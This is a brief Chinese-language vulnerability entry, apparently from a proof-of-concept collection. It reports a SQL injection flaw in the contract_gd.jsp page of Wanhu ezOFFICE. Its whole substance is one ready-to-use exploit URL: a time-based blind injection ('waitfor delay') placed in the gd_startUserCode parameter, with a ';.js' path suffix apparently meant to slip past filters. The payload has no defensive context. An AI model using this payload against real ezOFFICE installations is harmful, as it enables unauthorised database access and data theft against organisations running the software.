## 万户ezOFFICE-contract_gd.jsp存在SQL注入漏洞


## poc
```
/defaultroot/modules/subsidiary/contract/contract_gd.jsp;.js?gd=1&gd_startUserCode=1%27%3Bwaitfor%20delay%20%270%3A0%3A5%27--
```

